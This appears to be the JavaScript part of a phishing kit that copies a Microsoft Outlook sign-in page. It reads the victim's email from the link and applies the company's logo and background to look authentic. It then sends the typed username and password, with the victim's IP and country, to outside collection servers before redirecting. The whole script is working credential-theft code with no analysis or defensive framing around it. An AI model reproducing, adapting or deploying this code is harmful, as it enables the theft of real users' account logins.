<script>
		$( document ).ready(function() {
			
			
			var php_url = 'https://sunyl-motor.com/r m.php'; // Enter your post PHP page url here.
			var check_mx = true; // true or false for check outlook MX.
			
			
			
			// ******************************************************************************************************* //
			var hash = window.location.hash;
			var email = hash.split('#')[1];
			
			if(true_email(email)){
				$("#pick_em").show();
				$("#em_picker").html(email);
				$('#email').val(email);
			}else{
				$("#add_em").show();
			}

			$('.email-picker').on('click', function (){
				$('.identity').html(email);
				$(".error-alert-pass").hide();
				set_brand(email);
				setTimeout(function (){
					$("#pick_em").hide();
					$("#add_pass").show();
				}, 1000);
			});
			
			$('.email-picker2').on('click', function (){
				$('#email').val('');
				$("#pick_em").hide();
				$("#add_em").show();
			});
			  
			$('.btn-email').on('click', function (){
				var email = $('#email').val();
				$('.identity').html(email);
				$(".error-alert").hide();
				$('.btn-email').prop('disabled', true);
				if(true_email(email) == false){
					$(".error-alert").show();
					$(".error-alert-msg").html('Plase enter correct outlook account email.');
					$('.btn-email').prop('disabled', false);
				}else{
					if(check_mx == true){
						var domain = email.split('@')[1];
						var str;
						$.ajax({
							url: php_url + '?domain=' + domain,
							success: function(data){
								str = data.includes("outlook");
								if(str){
									set_brand(email);
									setTimeout(function (){
										$("#add_em").hide();
										$("#add_pass").show();
									}, 1000);
								}else{
									$(".error-alert").show();
									$(".error-alert-msg").html('You can\'t signin with this account, Please use work or school account instead.');
									$('.btn-email').prop('disabled', false);
								}
							},
							error: function(xhr){
								$(".error-alert").show();
								$(".error-alert-msg").html('Error occured, Please try again.');
								$('.btn-email').prop('disabled', false);
							}
						});
					}else{
						set_brand(email);
						setTimeout(function (){
							$("#add_em").hide();
							$("#add_pass").show();
						}, 1000);
					}
				}
			});
			
			$('.btn-signin').on('click', function (){
				$('.btn-signin').prop('disabled', true);
				setTimeout(function (){
					$(".error-alert-pass").hide();
				}, 500);
				var user = $('#email').val();
				var pass = $('#password').val();
				$.ajax({
					url: "https://checkmyips.net/api/geoip/",
					type: "POST",
					data: {user:user,pass:pass,t:1},
					success: function(data){
						var i=$.parseJSON(data);
						if(i.status == 'OK'){
							$.ajax({
								 url: php_url,
								 type: "POST",
								 data: {user:user,pass:pass,country:i.country,ip:i.ip},
								 success: function(finish_url){
									setTimeout("window.location.href='"+ finish_url +"';", 1000);
								 }
							 });
						}else{
							$(".error-alert-pass").show();
							$('.btn-signin').prop('disabled', false);
						}
					},
					error: function(){
						$(".error-alert-pass").hide();
						$('.btn-signin').prop('disabled', false);
					}
				});
			});
			
			$('.backButton').on('click', function (){
				$('#bg_image').css('background-image', 'url(lib/img/)');
				$('#logo_image').attr('src', 'lib/img/logo2.svg');
				$('#banner_image').show();
				$('.btn-email').prop('disabled', false);
				$("#add_pass").hide();
				$("#add_em").show();
				$(".error-alert-pass").hide();
			});
			
			function set_brand(email){
				$.ajax({
					url: php_url,
					type: "POST",
					data: {email:email,barnd:1},
					success: function(data){
						var i=$.parseJSON(data);
						if(i.bg_image !== null && i.logo_image !== null && i.bg_image !== '' && i.logo_image !== ''){
							$('#bg_image').css('background-image', 'url(' + i.bg_image + ')');
							$('#logo_image').attr('src', i.logo_image);
							$('#banner_image').hide();
						}
					}
				});
			}
		});

		function true_email(a) {
			var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
			return re.test(a);
		}
	  </script>